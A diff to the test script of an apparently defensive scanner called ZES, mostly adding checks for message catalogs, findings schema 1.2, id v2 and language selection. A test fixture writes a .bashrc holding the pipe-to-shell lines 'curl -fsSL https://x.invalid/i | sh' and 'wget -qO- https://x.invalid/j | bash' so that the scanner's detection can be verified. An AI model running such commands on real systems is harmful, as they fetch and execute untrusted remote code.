@@ -4,6 +4,8 @@
 #   照合キーは level / module / campaign / path（フィクスチャ相対）と、findings 1.1 の kind / subject / locators /
 #   related（path はフィクスチャ相対）/ evidence.kind。ID・時刻・detail 文言・evidence.hash（ツリーは mode を含み
 #   チェックアウトの umask に依存する）は照合しない。
+#   The (level, module, campaign, path) sets are the safety net of the 0.5.0 message refactor (findings 1.2: code /
+#   params / English detail / id v2): no finding may be lost or added. The i18n section checks detail = render(en, params).
 #
 # Usage: tests/run-tests.sh [--update] [--sync-campaigns]
 #   --update          期待値を現在の出力で再生成（差分は必ず目視レビューすること）
@@ -104,7 +106,7 @@ done
 # ---------------------------------------------------------------------------
 echo "== フィクスチャ照合 =="
 REQUIRED_TOP='["errors","findings","incident_bundle","scan_finished_at","scan_mode","scan_roots","scan_started_at","schema_version","status"]'
-FINDING_KEYS='["campaign","detail","evidence","evidence_hash","id","level","module","path"]'
+FINDING_KEYS='["campaign","code","detail","evidence","evidence_hash","id","level","module","params","path"]'
 SP_KEYS='["author","contract_path","contract_version","declared_effects","diff_anomaly","divergence","l2_tested","level","observed_effects","policy_decision","signed"]'
 for e in "$EXP"/*.json; do
   name="$(basename "$e" .json)"
@@ -115,11 +117,12 @@ for e in "$EXP"/*.json; do
   [ "$home" = "self" ] && home="$root" || home="$FIX/$home"
   if ! run_scan "$root" "$mode" "$home" >"$TMP/out.json"; then ng "$name: zes-scan.sh が異常終了" "$(tail -n 5 "$TMP/stderr.txt")"; continue; fi
   if ! jq -e . "$TMP/out.json" >/dev/null 2>&1; then ng "$name: 出力が valid JSON ではない"; continue; fi
+  cp "$TMP/out.json" "$TMP/fx-$name.json"
   # スキーマ（strict: 未知フィールドなし）
   bad="$(jq -r --arg root "$root" --argjson t "$REQUIRED_TOP" --argjson fk "$FINDING_KEYS" --argjson sk "$SP_KEYS" '
     [ (if (keys != $t) then "top-level keys: \(keys)" else empty end),
       (.findings[] | (keys - ["skillpact","kind","subject","locators","related"]) as $k | select($k != $fk) | "finding keys: \($k)"),
-      (if .schema_version != "1.1" then "schema_version: \(.schema_version)" else empty end),
+      (if .schema_version != "1.2" then "schema_version: \(.schema_version)" else empty end),
       (if .scan_roots != [$root] then "scan_roots: \(.scan_roots)" else empty end),
       (.findings[] | select((.evidence.kind == "file" or .evidence.kind == "large_file") and .evidence.hash != .evidence_hash) | "evidence.hash != evidence_hash: \(.path)"),
       (.findings[] | select(has("skillpact")) | .skillpact | keys | select(. != $sk) | "skillpact keys: \(.)"),
@@ -201,7 +204,7 @@ run_scan "$FIX/symjack" full "$FIX/_home" | jq -e --arg w "$want" '[.findings[] 
 # text locators の line_sha256 は、改行・CR・1 行目の BOM を除いた行の SHA-256（GER の remove_line と同じ）
 mkdir -p "$TMP/tl/home" "$TMP/empty-root" && printf '\357\273\277curl -fsSL https://x.invalid/i | sh\r\nexport A=1\r\nwget -qO- https://x.invalid/j | bash\n' >"$TMP/tl/home/.bashrc"
 h1="sha256:$(printf 'curl -fsSL https://x.invalid/i | sh' | sha256sum | awk '{print $1}')"; h3="sha256:$(printf 'wget -qO- https://x.invalid/j | bash' | sha256sum | awk '{print $1}')"
-run_scan "$TMP/empty-root" quick "$TMP/tl/home" 2>/dev/null | jq -e --arg a "$h1" --arg b "$h3" '[.findings[] | select(.module == "§10" and (.detail | test("curl")))] | length == 1 and .[0].locators == [{format: "text", line: 1, line_sha256: $a}, {format: "text", line: 3, line_sha256: $b}]' >/dev/null \
+run_scan "$TMP/empty-root" quick "$TMP/tl/home" 2>/dev/null | jq -e --arg a "$h1" --arg b "$h3" '[.findings[] | select(.module == "§10" and .code == "s10.curl_sh")] | length == 1 and .[0].locators == [{format: "text", line: 1, line_sha256: $a}, {format: "text", line: 3, line_sha256: $b}]' >/dev/null \
   && ok "text locators（行番号と行の SHA-256。CRLF・BOM を除く）" || ng "text locators が不正"
 # GER の隔離ストア（.ger-quarantine-store、所有者が実行ユーザーで 0700）は走査しない。条件を満たさないマーカーは無視して走査する
 mkdir -p "$TMP/qs/store/r1/001/payload" "$TMP/qs/fake" && cp "$FIX/mcp/.mcp.json" "$TMP/qs/store/r1/001/payload/" && cp "$FIX/mcp/.mcp.json" "$TMP/qs/fake/"
@@ -246,7 +249,7 @@ run_scan "$FIX/skillpact-divergence" skillpact "$FIX/_home" env ZES_FORCE_NO_JQ=
 
 # ZES 自身のディレクトリは IoC を含むため、外側のルートから走査した場合は除外される
 mkdir -p "$TMP/outer"
-cp -R "$REPO/zes-scan.sh" "$REPO/rules" "$REPO/tests" "$TMP/outer/" 2>/dev/null
+cp -R "$REPO/zes-scan.sh" "$REPO/rules" "$REPO/i18n" "$REPO/tests" "$TMP/outer/" 2>/dev/null
 mkdir -p "$TMP/outer-root" && mv "$TMP/outer" "$TMP/outer-root/zes"
 n="$(ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$TMP/outer-root/zes/zes-scan.sh" --quick --root "$TMP/outer-root" --json 2>/dev/null | jq --arg r "$TMP/outer-root/zes/" '[.findings[] | select((.path // "") | startswith($r))] | length' 2>/dev/null)"
 [ "${n:-x}" = "0" ] && ok "ZES 自身（rules/tests/docs）を外側から走査した場合は除外" || ng "ZES 自身のファイルを検出しています（$n 件）"
@@ -287,7 +290,7 @@ if command -v git >/dev/null 2>&1 && command -v mkfifo >/dev/null 2>&1 && comman
   mkfifo "$TMP/git-inc/.git/hang.fifo" && printf '[include]\n\tpath = hang.fifo\n[includeIf "gitdir:/"]\n\tpath = hang.fifo\n' >>"$TMP/git-inc/.git/config"
   out="$(ZES_GIT_TIMEOUT=10 timeout 120 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --full --root "$TMP/git-inc" --json 2>/dev/null)"
   # include の参照先（FIFO）は読まずに git_include_unresolved を記録し、git の失敗（git_timeout 等）は起きない
-  printf '%s' "$out" | jq -e '([.findings[] | select(.module == "§46" and (.detail | test("1 コミット中")))] | length == 1) and ([.errors[] | select(.reason | test("^git_")) | select(.reason | test("^git_include_unresolved:") | not)] | length == 0) and ([.errors[] | select(.reason | test("^git_include_unresolved:"))] | length >= 1)' >/dev/null 2>&1 \
+  printf '%s' "$out" | jq -e '([.findings[] | select(.module == "§46" and .code == "s46.unsigned" and .params.total == "1")] | length == 1) and ([.errors[] | select(.reason | test("^git_")) | select(.reason | test("^git_include_unresolved:") | not)] | length == 0) and ([.errors[] | select(.reason | test("^git_include_unresolved:"))] | length >= 1)' >/dev/null 2>&1 \
     && ok "検査対象 .git/config の include.path（FIFO）を読まずに §46 を完走（errors[] に git_include_unresolved）" || ng "include.path（FIFO）で走査が停止または §46 が失敗"
   mkfifo "$TMP/git-pr/.git/packed-refs"
   out="$(ZES_GIT_TIMEOUT=2 timeout 120 env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" "$SCAN" --full --root "$TMP/git-pr" --json 2>/dev/null)"
@@ -308,13 +311,16 @@ if python3 -I -c 'pass' 2>/dev/null; then
 import hashlib, json, sys
 raw = open(sys.argv[1], "rb").read()
 d = json.loads(raw.decode("utf-8"))  # strict UTF-8
-bad = [f["path"] for f in d["findings"] if f["id"] != "sha256:" + hashlib.sha256("|".join([f["module"], f["campaign"] or "", f["path"] or "", f["detail"]]).encode()).hexdigest()]
+def v2(f):
+    canon = "\x1f".join(k + "=" + f["params"][k] for k in sorted(f["params"], key=lambda k: k.encode()))
+    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2", f["module"], f["campaign"] or "", f["path"] or "", f["code"], canon]).encode()).hexdigest()
+bad = [f["path"] for f in d["findings"] if f["id"] != v2(f)]
 n = len([f for f in d["findings"] if f["module"] == "§17"])
 nu = len([e for e in d["errors"] if e["module"] == "core" and e["reason"].startswith("non_utf8_path:") and "\\xff\\xfe" in e["reason"]])
 print(f"mismatch={bad} s17={n} non_utf8={nu}")
 sys.exit(0 if not bad and n == 5 and nu == 1 else 1)
 PY
-)"; then ok "制御文字・不正 UTF-8 のパス: valid UTF-8 JSON・id 再計算一致・errors[] に non_utf8_path"
+)"; then ok "制御文字・不正 UTF-8 のパス: valid UTF-8 JSON・id v2 再計算一致・errors[] に non_utf8_path"
   else ng "制御文字・不正 UTF-8 のパスの出力が不正" "$out"; fi
 else
   printf '  SKIP 不正 UTF-8 パスの JSON 検証（python3 が無い）\n'
@@ -375,8 +381,8 @@ PY
   urlscan() { env -u http_proxy -u HTTP_PROXY -u https_proxy -u HTTPS_PROXY -u ALL_PROXY -u all_proxy NO_PROXY='*' \
     ZES_HOST_CHECKS=0 ZES_OFFLINE=0 ZES_HOME="$FIX/_home" "$SCAN" --quick --root "$TMP/empty-root" --url "http://127.0.0.1:$port$1" --json 2>/dev/null; }
   out="$(urlscan /)"
-  printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "HIGH" and (.detail | test("8\\.3\\.10")))] | length == 1' >/dev/null 2>&1 \
-    && printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "MEDIUM" and (.detail | test("X-Powered-By")))] | length == 1' >/dev/null 2>&1 \
+  printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "HIGH" and .params.version == "8.3.10")] | length == 1' >/dev/null 2>&1 \
+    && printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "MEDIUM" and .code == "s4.header_exposes")] | length == 1' >/dev/null 2>&1 \
     && ok "--url: Server ヘッダの PHP/8.3.10 を HIGH（ヘッダ申告版）で判定し、X-Powered-By の露出も報告" || ng "--url の PHP ヘッダ判定が不正"
   out="$(urlscan /redir)"
   printf '%s' "$out" | jq -e '[.findings[] | select(.module == "§4" and .level == "HIGH")] | length == 0' >/dev/null 2>&1 \
@@ -403,6 +409,174 @@ n="$(cd "$TMP/cdpath/cwd" && CDPATH="$TMP/cdpath/decoy" ZES_HOST_CHECKS=0 ZES_OF
 
 # 版の一致: CHANGELOG の先頭の版 = zes-scan.sh の ZES_VERSION = ui/package.json の version
 if out="$(bash "$TESTS_DIR/check-versions.sh" 2>&1)"; then ok "$out"; else ng "版がずれています" "$out"; fi
+# ---------------------------------------------------------------------------
+echo "== i18n（メッセージカタログ・findings 1.2） =="
+# Catalog files: same keys and placeholders in en / ja, one entry per line in C-locale key order, only \" and \\ escapes,
+#   no URL / HTML / control characters, no Japanese in en.json; every f.* / log.* / cli.* key used by zes-scan.sh exists
+#   and every such key is used; the inline cli.* block of zes-scan.sh equals the catalog; no CJK outside comments in
+#   zes-scan.sh except the Bash < 4 message and the Japanese cli.* block
+if out="$(python3 -I - "$REPO" <<'PY' 2>&1
+import json, re, subprocess, sys
+repo = sys.argv[1]
+err = []
+raw = {l: open(f"{repo}/i18n/{l}.json", encoding="utf-8").read() for l in ("en", "ja")}
+cat = {l: json.loads(raw[l]) for l in raw}
+holes = lambda s: sorted(re.findall(r"\{([a-z_]+)\}", s))
+CJK = re.compile(r"[　-ヿ㐀-鿿＀-￯]")
+for l in raw:
+    lines = raw[l].split("\n")
+    if lines[0] != "{" or lines[-1] != "" or lines[-2] != "}": err.append(f"{l}.json: frame")
+    body = lines[1:-2]; keys = []
+    for i, line in enumerate(body):
+        m = re.fullmatch(r'"([a-z0-9_.]+)": "((?:[^"\\]|\\["\\])*)"(,?)', line)
+        if not m: err.append(f"{l}.json:{i + 2}: {line[:80]}"); continue
+        if m.group(3) != ("" if i == len(body) - 1 else ","): err.append(f"{l}.json:{i + 2}: comma")
+        keys.append(m.group(1))
+    if keys != sorted(keys, key=lambda k: k.encode()): err.append(f"{l}.json: keys not in C-locale order")
+    for k, v in cat[l].items():
+        if re.search(r"https?://", v) or re.search(r"</?[a-z][a-z0-9]*[\s>/]", v, re.I) or re.search(r"[\x00-\x1f\x7f‪-‮⁦-⁩]", v):
+            err.append(f"{l}.json: {k}: URL, HTML or control character")
+if set(cat["en"]) != set(cat["ja"]): err.append(f"en/ja keys differ: {sorted(set(cat['en']) ^ set(cat['ja']))[:10]}")
+for k in cat["en"]:
+    if k in cat["ja"] and holes(cat["en"][k]) != holes(cat["ja"][k]): err.append(f"placeholders differ: {k}")
+    if CJK.search(cat["en"][k]) and not k.startswith("ui.lang."): err.append(f"en.json has Japanese: {k}")
+src = open(f"{repo}/zes-scan.sh", encoding="utf-8").read()
+code = "\n".join(l for l in src.split("\n") if not l.lstrip().startswith("#"))
+used_f = set(re.findall(r"(?<![\w.$/-])((?:s[0-9]+|intel)\.[a-z0-9_.]*[a-z0-9_])(?!\w)", code))
+cat_f = {k[2:] for k in cat["en"] if k.startswith("f.")}
+if used_f - cat_f: err.append(f"codes missing from the catalog: {sorted(used_f - cat_f)}")
+if cat_f - used_f: err.append(f"f.* keys not used by zes-scan.sh: {sorted(cat_f - used_f)}")
+used_l = set(re.findall(r"(?:log_info|safe|msg) (log\.[a-z0-9_.]+)", code)) | {f"log.section.s{n}" for n in re.findall(r'log_section "§([0-9]+)"', code)}
+cat_l = {k for k in cat["en"] if k.startswith("log.")}
+if used_l ^ cat_l: err.append(f"log.* keys: missing {sorted(used_l - cat_l)} unused {sorted(cat_l - used_l)}")
+dump = subprocess.run(["bash", "-c", 'eval "$(sed -n "/^# >>> cli-messages/,/^# <<< cli-messages/p" "$1")"; for k in "${!CLI_MSG_EN[@]}"; do printf "E\\037%s\\037%s\\036" "$k" "${CLI_MSG_EN[$k]}"; done; for k in "${!CLI_MSG_JA[@]}"; do printf "J\\037%s\\037%s\\036" "$k" "${CLI_MSG_JA[$k]}"; done; printf "H\\037%s\\036" "${CLI_HELP_LINES[@]}"', "_", f"{repo}/zes-scan.sh"], capture_output=True, text=True).stdout
+inline = {"en": {}, "ja": {}}; help_keys = []
+for rec in dump.split("\x1e"):
+    if not rec: continue
+    p = rec.split("\x1f")
+    if p[0] == "H": help_keys.append(p[1]); continue
+    inline["en" if p[0] == "E" else "ja"][p[1]] = p[2]
+for l in ("en", "ja"):
+    cat_c = {k: v for k, v in cat[l].items() if k.startswith("cli.")}
+    if cat_c != inline[l]: err.append(f"inline cli.* ({l}) differs from {l}.json: {sorted(set(cat_c.items()) ^ set(inline[l].items()))[:4]}")
+used_c = set(re.findall(r"(?:arg_error|cli_fail|cli_text) (cli\.[a-z0-9_.]+)", code)) | {k for k in help_keys if k}
+if used_c ^ set(inline["en"]): err.append(f"cli.* keys: missing {sorted(used_c - set(inline['en']))} unused {sorted(set(inline['en']) - used_c)}")
+blk = src[src.index("# >>> cli-messages"):src.index("# <<< cli-messages")]
+for i, l in enumerate(src.split("\n"), 1):
+    m = CJK.search(l)
+    if not m or l.lstrip().startswith("#") or (l in blk and l.lstrip().startswith("[cli.")) or l.startswith('  echo "ZES: Bash 4 以上'): continue
+    if not re.search(r"\s#", l[:m.start()]): err.append(f"zes-scan.sh:{i}: Japanese outside a comment")
+print("\n".join(err[:30]) or f"f.*={len(cat_f)} log.*={len(cat_l)} cli.*={len(inline['en'])}")
+sys.exit(1 if err else 0)
+PY
+)"; then ok "カタログ i18n/en.json・ja.json（$out）: 形式・キー・プレースホルダ・zes-scan.sh の使用と一致"
+else ng "カタログ i18n/*.json が不正" "$out"; fi
+
+# render: the cases shared with the UI (i18n/tests/render-cases.json) through the bash zes_render of zes-scan.sh
+if out="$(python3 -I - "$REPO" <<'PY' 2>&1
+import json, subprocess, sys
+repo = sys.argv[1]
+cases = json.load(open(f"{repo}/i18n/tests/render-cases.json", encoding="utf-8"))["cases"]
+prog = 'set -u; export LC_ALL=C; eval "$(sed -n "/^zes_render() {/,/^}/p" "$1")"; t="$2"; shift 2; zes_render "$t" "$@"; printf "%s" "$RENDERED"'
+bad = []
+for c in cases:
+    params = {k: v.encode() for k, v in c.get("params", {}).items()}
+    params.update({k: bytes.fromhex(v) for k, v in c.get("params_hex", {}).items()})
+    want = bytes.fromhex(c["expected_hex"]) if "expected_hex" in c else c["expected"].encode()
+    args = [b"bash", b"-c", prog.encode(), b"_", f"{repo}/zes-scan.sh".encode(), c["template"].encode()] + [k.encode() + b"=" + v for k, v in params.items()]
+    got = subprocess.run(args, capture_output=True).stdout
+    if got != want: bad.append(f"{c['name']}: {got!r} != {want!r}")
+print("\n".join(bad) or f"{len(cases)} cases")
+sys.exit(1 if bad else 0)
+PY
+)"; then ok "render（bash）が i18n/tests/render-cases.json と一致（$out）"
+else ng "render（bash）が render-cases と不一致" "$out"; fi
+
+# Every finding of every fixture: code is in the catalog, params are exactly the placeholders of f.<code>,
+#   detail = render(en["f." + code], params), id = id v2, and findings.json has no Japanese
+if out="$(python3 -I - "$REPO" "$TMP"/fx-*.json <<'PY' 2>&1
+import hashlib, json, re, sys
+repo = sys.argv[1]
+en = json.load(open(f"{repo}/i18n/en.json", encoding="utf-8"))
+CJK = re.compile(r"[　-ヿ㐀-鿿＀-￯]")
+render = lambda t, p: re.sub(r"\{([a-z_]+)\}", lambda m: p.get(m.group(1), m.group(0)), t)
+bad = []; n = 0; codes = set()
+for f in sys.argv[2:]:
+    raw = open(f, "rb").read().decode("utf-8")
+    if CJK.search(raw): bad.append(f"{f.rsplit('/', 1)[-1]}: Japanese in findings.json: {CJK.search(raw).group(0)}")
+    for x in json.loads(raw)["findings"]:
+        n += 1; codes.add(x["code"]); t = en.get("f." + x["code"])
+        if t is None: bad.append(f"unknown code {x['code']}"); continue
+        if sorted(x["params"]) != sorted(set(re.findall(r"\{([a-z_]+)\}", t))): bad.append(f"params {x['code']}: {sorted(x['params'])}")
+        if x["detail"] != render(t, x["params"]): bad.append(f"detail {x['code']}: {x['detail'][:80]}")
+        canon = "\x1f".join(k + "=" + x["params"][k] for k in sorted(x["params"], key=lambda k: k.encode()))
+        if x["id"] != "sha256:" + hashlib.sha256("|".join(["zes-id-v2", x["module"], x["campaign"] or "", x["path"] or "", x["code"], canon]).encode()).hexdigest():
+            bad.append(f"id {x['code']} {x['path']}")
+print("\n".join(bad[:20]) or f"{n} findings, {len(codes)} codes")
+sys.exit(1 if bad or n == 0 else 0)
+PY
+)"; then ok "全フィクスチャの finding: detail = render(en, params)・params = プレースホルダ・id v2・日本語なし（$out）"
+else ng "フィクスチャの finding の code / params / detail / id が不正" "$out"; fi
+
+# findings.json does not depend on the terminal language: byte-identical (except the timestamps) for --lang en,
+#   --lang ja, LANG=ja_JP.UTF-8 and LANG=C; the log follows the language
+lang_ok=1; lang_msg=""
+for nm in chaindrop skillpact-signed-divergence php gitlab; do
+  dm="$(jq -r '.mode' "$EXP/$nm.json")"
+  i=0
+  for v in "--lang en" "--lang ja" "LANG=ja_JP.UTF-8" "LANG=C"; do
+    i=$((i + 1))
+    case "$v" in
+      --lang*) ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" ZES_NOW=1792800000 ZES_SKILLPACT_CACHE='' LANG=C LC_ALL='' "$SCAN" "--$dm" --root "$FIX/$nm" --json $v >"$TMP/lang-$i.json" 2>"$TMP/lang-$i.log" ;;
+      *) env ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$FIX/_home" ZES_NOW=1792800000 ZES_SKILLPACT_CACHE='' LC_ALL='' "$v" "$SCAN" "--$dm" --root "$FIX/$nm" --json >"$TMP/lang-$i.json" 2>"$TMP/lang-$i.log" ;;
+    esac
+    sed -E 's/"scan_(started|finished)_at":"[^"]*"//g' "$TMP/lang-$i.json" >"$TMP/lang-$i.norm"
+  done
+  for i in 2 3 4; do cmp -s "$TMP/lang-1.norm" "$TMP/lang-$i.norm" || { lang_ok=0; lang_msg="$lang_msg $nm#$i"; }; done
+  [ "$(jq '.findings | length' "$TMP/lang-1.json")" -gt 0 ] || { lang_ok=0; lang_msg="$lang_msg $nm:empty"; }
+  grep -q '結果' "$TMP/lang-2.log" && grep -q '結果' "$TMP/lang-3.log" && grep -q '== Result ==' "$TMP/lang-1.log" && grep -q '== Result ==' "$TMP/lang-4.log" \
+    || { lang_ok=0; lang_msg="$lang_msg $nm:log"; }
+done
+[ "$lang_ok" -eq 1 ] && ok "findings.json は --lang en / --lang ja / LANG=ja_JP.UTF-8 / LANG=C で時刻以外同一（ログは選んだ言語）" || ng "findings.json が端末の言語で変わる:$lang_msg"
+
+# jq-less runs give the same detail / code / params / id (every finding of the grep fallback is in the jq run)
+run_scan "$FIX/chaindrop" quick "$FIX/_home" >"$TMP/jq-yes.json"
+run_scan "$FIX/chaindrop" quick "$FIX/_home" env ZES_FORCE_NO_JQ=1 >"$TMP/jq-no.json"
+if jq -e -n --slurpfile a "$TMP/jq-yes.json" --slurpfile b "$TMP/jq-no.json" '
+    ([$a[0].findings[] | {id, detail, code, params}]) as $y | [$b[0].findings[] | {id, detail, code, params}] as $n
+    | ($n | length) > 0 and all($n[]; . as $f | $y | index([$f]) != null)' >/dev/null; then
+  ok "jq なしでも detail / code / params / id が jq ありと同じ（grep フォールバックの全 finding が jq ありの出力にある）"
+else ng "jq の有無で detail / code / params / id が変わる"; fi
+
+# Terminal language: --lang > ZES_LANG > LC_ALL > LC_MESSAGES > LANG; ja (no charset / UTF-8) → ja, eucJP / SJIS → en
+lsel() { env -u LC_ALL -u LC_MESSAGES -u LANG -u ZES_LANG "$@" "$SCAN" --help 2>/dev/null | grep -c -F -e '検査ルート'; }
+sel_ok=1; sel_msg=""
+for c in "ja|LANG=ja_JP.UTF-8" "ja|LANG=ja_JP.utf8" "ja|LANG=ja_JP" "ja|LANG=ja" "en|LANG=ja_JP.eucJP" "en|LANG=ja_JP.SJIS" "en|LANG=C" "en|LANG=C.UTF-8" \
+         "en|LANG=en_US.UTF-8" "en|LANG=fr_FR.UTF-8" "ja|LC_ALL=ja_JP.UTF-8 LANG=C" "en|LC_ALL=C LANG=ja_JP.UTF-8" "ja|LC_MESSAGES=ja_JP.UTF-8 LANG=C" \
+         "en|LC_MESSAGES=C LANG=ja_JP.UTF-8" "ja|ZES_LANG=ja LANG=C" "en|ZES_LANG=en LANG=ja_JP.UTF-8" "en|ZES_LANG=xx LANG=ja_JP.UTF-8" "en|"; do
+  want="${c%%|*}"; e="${c#*|}"
+  # shellcheck disable=SC2086
+  n="$(lsel $e)"; [ "$want" = ja ] && [ "$n" = 1 ] && continue; [ "$want" = en ] && [ "$n" = 0 ] && continue
+  sel_ok=0; sel_msg="$sel_msg [$e → ${want}?]"
+done
+n="$(env -u LC_ALL -u LANG ZES_LANG=en "$SCAN" --help --lang ja 2>/dev/null | grep -c -F '検査ルート')"; [ "$n" = 1 ] || { sel_ok=0; sel_msg="$sel_msg [--help --lang ja]"; }
+n="$(env LANG=ja_JP.UTF-8 "$SCAN" --lang en --help 2>/dev/null | grep -c -F 'Directory to scan')"; [ "$n" = 1 ] || { sel_ok=0; sel_msg="$sel_msg [--lang en --help]"; }
+env -u LC_ALL LANG=C "$SCAN" --quick --lang xx >/dev/null 2>"$TMP/lang-xx.err"; rc=$?
+{ [ "$rc" = 64 ] && grep -q -x -F 'ZES: --lang must be en or ja' "$TMP/lang-xx.err"; } || { sel_ok=0; sel_msg="$sel_msg [--lang xx rc=$rc]"; }
+env -u LC_ALL LANG=C "$SCAN" --quick --lang >/dev/null 2>&1; [ $? = 64 ] || { sel_ok=0; sel_msg="$sel_msg [--lang without a value]"; }
+env -u LC_ALL LANG=C "$SCAN" --lang ja --bogus >/dev/null 2>"$TMP/lang-arg.err"; rc=$?
+{ [ "$rc" = 64 ] && grep -q -F 'ZES: 不明な引数: --bogus' "$TMP/lang-arg.err"; } || { sel_ok=0; sel_msg="$sel_msg [arg error in ja rc=$rc]"; }
+env -u LC_ALL LANG=C "$SCAN" --bogus >/dev/null 2>"$TMP/lang-arg.err"; rc=$?
+{ [ "$rc" = 64 ] && grep -q -F 'ZES: Unknown argument: --bogus' "$TMP/lang-arg.err"; } || { sel_ok=0; sel_msg="$sel_msg [arg error in en rc=$rc]"; }
+[ "$sel_ok" -eq 1 ] && ok "端末の言語の選択（--lang > ZES_LANG > LC_ALL > LC_MESSAGES > LANG、eucJP / SJIS / 不正な ZES_LANG は en、--lang xx は 64）" || ng "端末の言語の選択が不正:$sel_msg"
+# The help and argument errors equal the catalog (cli.*): checked above with the inline block. An unreadable catalog is exit 64
+ZES_I18N_DIR="$TMP/no-catalog" run_scan "$FIX/chaindrop" quick "$FIX/_home" >/dev/null; rc=$?
+{ [ "$rc" = 64 ] && grep -q -F "ZES: cannot read the message catalog: $TMP/no-catalog/en.json" "$TMP/stderr.txt"; } \
+  && ok "メッセージカタログを読めない場合は exit 64" || ng "読めないメッセージカタログで exit 64 にならない（rc=$rc）"
+mkdir -p "$TMP/bad-catalog" && printf '{\n"f.x": "a\\u0041"\n}\n' >"$TMP/bad-catalog/en.json"
+ZES_I18N_DIR="$TMP/bad-catalog" run_scan "$FIX/chaindrop" quick "$FIX/_home" >/dev/null; rc=$?
+[ "$rc" = 64 ] && ok "形式の不正なメッセージカタログ（\\u エスケープ）は exit 64" || ng "形式の不正なカタログを受理（rc=$rc）"
+
 # ---------------------------------------------------------------------------
 echo "== round 3（CLI の検出回避・fail-closed） =="
 # R3-01: PATH の相対・空のエントリと、実パスが検査ルート配下のエントリは外し、errors[] に path_entry_dropped を記録する
@@ -509,7 +683,7 @@ if [ "$(id -u)" = "0" ]; then command -v setpriv >/dev/null 2>&1 && as_user="set
 if [ -n "$as_user" ]; then
   P="$TMP/r3perm"; mkdir -p "$P/root/locked" "$P/root/d" "$P/home" "$P/zes" "$P/unreadable-root"
   printf '# yarn lockfile v1\n' >"$P/root/locked/yarn.lock"; printf '# yarn lockfile v1\n' >"$P/root/d/yarn.lock"
-  cp -R "$SCAN" "$REPO/rules" "$P/zes/"
+  cp -R "$SCAN" "$REPO/rules" "$REPO/i18n" "$P/zes/"
   chmod 755 "$TMP" "$P" "$P/root" "$P/root/d" "$P/home" "$P/zes"; chmod -R a+rX "$P/zes"
   chmod 000 "$P/root/locked" "$P/root/d/yarn.lock"; chmod 311 "$P/unreadable-root"
   out="$(cd / && $as_user env HOME="$P/home" TMPDIR=/tmp ZES_HOST_CHECKS=0 ZES_OFFLINE=1 ZES_HOME="$P/home" "$P/zes/zes-scan.sh" --worm --root "$P/root" --json 2>/dev/null)"
